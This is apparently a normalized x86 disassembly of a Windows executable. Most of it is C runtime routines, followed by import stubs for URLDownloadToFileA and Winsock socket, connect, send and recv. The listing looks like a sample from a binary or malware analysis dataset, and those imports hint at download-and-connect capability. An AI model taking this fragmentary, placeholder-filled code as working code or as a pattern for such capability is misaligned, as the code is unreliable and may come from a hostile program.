movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_40808d
push ebx
call sub_40808d
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40802f
push ebx
call sub_40808d
mov eax [ ebp + 0x8 ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
movsx eax [ eax ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_40802f
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
pop edi
mov ax [ ebp - 0x4 ]
pop esi
mov [ ebx + 0xa ] ax
pop ebx
leave
retn
push ebx
call sub_40808d
add [ ebp - 0x4 ] 0xffff
pop ecx
jmp r-xdata
test [ ebx + 0x8 ] esi
jne r-xdata
sub_4081af
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_40800e
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8000
ja r-xdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40808d
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4080bb
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x24 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp r-xdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne r-xdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp r-xdata
sub_4083cf
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
pop ebx
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ebx rw-data
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb r-xdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_4081af
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_40844b
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xcc
mov [ ebp - 0x19 ] 0xcc
mov [ ebp - 0x18 ] 0xcc
mov [ ebp - 0x17 ] 0xcc
mov [ ebp - 0x16 ] 0xcc
mov [ ebp - 0x15 ] 0xcc
mov [ ebp - 0x14 ] 0xcc
mov [ ebp - 0x13 ] 0xcc
mov [ ebp - 0x12 ] 0xfb
mov [ ebp - 0x11 ] 0x3f
mov [ ebp - 0x4 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test dx dx
jne r-xdata
movzx eax dx
mov ecx edi
mov esi eax
shr ecx 0x18
imul eax eax 0x4d10
shr esi 0x8
and [ ebp - 0x10 ] 0x0
push 0x1
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x6 ] dx
imul ecx ecx 0x4d
mov [ ebp - 0xa ] edi
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
sar esi 0x10
mov [ ebp - 0xe ] eax
movsx eax si
neg eax
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4083cf
add esp 0xc
cmp [ ebp - 0x6 ] 0x3fff
jb r-xdata
mov eax 0x80000000
mov [ ebx ] 0x1
cmp edi eax
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
test [ ebp + 0x18 ] 0x1
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x1c ]
inc esi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4081af
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov edi [ ebp + 0x14 ]
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx + 0x5 ] 0x0
push 0x1
pop eax
jmp r-xdata
movzx esi [ ebp - 0x6 ]
sub esi 0x3ffe
and [ ebp - 0x6 ] 0x0
mov [ ebp + 0x1c ] 0x8
push 0x15
pop edi
cmp edi 0x15
jle r-xdata
jmp r-xdata
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_406ca0
pop ecx
mov [ ebx + 0x3 ] 0x6
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_40808d
dec [ ebp + 0x1c ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea ecx [ edi + 0x1 ]
lea eax [ ebx + 0x4 ]
test ecx ecx
mov [ ebp + 0x1c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov cl [ eax - 0x1 ]
dec eax
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp + 0x14 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_4080bb
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_406ca0
pop ecx
mov [ ebx + 0x3 ] 0x5
pop ecx
cmp eax ecx
jb r-xdata
cmp eax ecx
jb r-xdata
lea esi [ ebp - 0x10 ]
lea edi [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
movsd [ edi ] [ esi ]
call sub_40808d
lea eax [ ebp - 0x10 ]
push eax
call sub_40808d
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40802f
lea eax [ ebp - 0x10 ]
push eax
call sub_40808d
mov al [ ebp - 0x5 ]
mov ecx [ ebp + 0x1c ]
and [ ebp - 0x5 ] 0x0
add esp 0x14
add al 0x30
inc [ ebp + 0x1c ]
dec [ ebp + 0x14 ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x1c ]
and [ ebx ] 0x0
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
mov [ ecx ] 0x30
cmp [ eax ] 0x30
jne r-xdata
inc eax
inc [ ebx ]
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
dec eax
jmp r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
jmp r-xdata
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
inc [ eax ]
sub_4086e0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_4044cd
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_40452e
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_4045b2
mov ebx eax
add esp 0x4
call sub_4045b2
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_4087b0
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_40881f
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_4044cd
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_40452e
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_40881f
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_4037d8
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_4076b5
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_401000
mov eax [ esp + 0x4 ]
retn 0x4
sub_401350
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_401310
add esp 0xc
retn
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
sub_402c47
push [ esp + 0x4 ]
call sub_4033db
pop ecx
retn
sub_402c52
push 0x1
push [ esp + 0x8 ]
call sub_4034d6
pop ecx
pop ecx
retn
sub_402ceb
push [ esp + 0x4 ]
call sub_402c60
pop ecx
retn
sub_402ea0
call sub_402eb8
call sub_4039db
mov [ rw-data ] eax
call sub_40398b
fnclex
retn
sub_402eb7
retn
sub_402eb8
mov eax sub_403db4
mov [ rw-data ] sub_403a5e
mov [ rw-data ] eax
mov [ rw-data ] sub_403ac4
mov [ rw-data ] sub_403a04
mov [ rw-data ] sub_403aac
mov [ rw-data ] eax
retn
sub_403291
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_403397
push rw-data
push rw-data
call sub_403397
add esp 0x10
retn
call eax
sub_4032be
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_4032e0
add esp 0xc
retn
sub_4032cf
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_4032e0
add esp 0xc
retn
sub_403385
push 0xd
call sub_4044cd
pop ecx
retn
sub_40338e
push 0xd
call sub_40452e
pop ecx
retn
sub_403445
push 0x9
call sub_40452e
pop ecx
retn
sub_40349d
push 0x9
call sub_40452e
pop ecx
retn
sub_403569
push 0x9
call sub_40452e
pop ecx
retn
sub_4035c8
push 0x9
call sub_40452e
pop ecx
retn
sub_4037b4
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_405e4a
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_405e11
sub_40398b
push 0x30000
push 0x10000
call sub_4069d8
pop ecx
pop ecx
retn
sub_403aac
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_403e9d
call sub_403f16
add eax 0x8
retn
sub_403ea6
call sub_403f16
add eax 0xc
retn
sub_403f03
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_4040b6
push 0x9
call sub_40452e
pop ecx
retn
sub_40413f
push 0x9
call sub_40452e
pop ecx
retn
sub_4042f4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40437e
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4042f4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4043aa
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_404489
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_404316
add esp 0x8
pop ebp
retn 0x4
sub_4044a4
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_40452e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 4 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_406096
push 0x1
pop eax
retn
sub_40644c
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4062e0
add esp 0xc
retn
sub_406462
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4062e0
add esp 0xc
retn
sub_4069d8
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_4069a3
pop ecx
pop ecx
retn
sub_407125
push 0x2
call sub_40378f
pop ecx
retn
sub_4077c5
push 0x1
pop eax
retn
sub_407879
push 0x1
pop eax
retn
sub_407904
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40791b
add esp 0x10
retn
sub_407b4f
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_407b60
add esp 0xc
retn
sub_407f69
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_407b91
pop ecx
mov [ rw-data ] 0x1
send
jmp [ send@IAT ]
recv
jmp [ recv@IAT ]
connect
jmp [ connect@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
htons
jmp [ htons@IAT ]
closesocket
jmp [ closesocket@IAT ]
socket
jmp [ socket@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
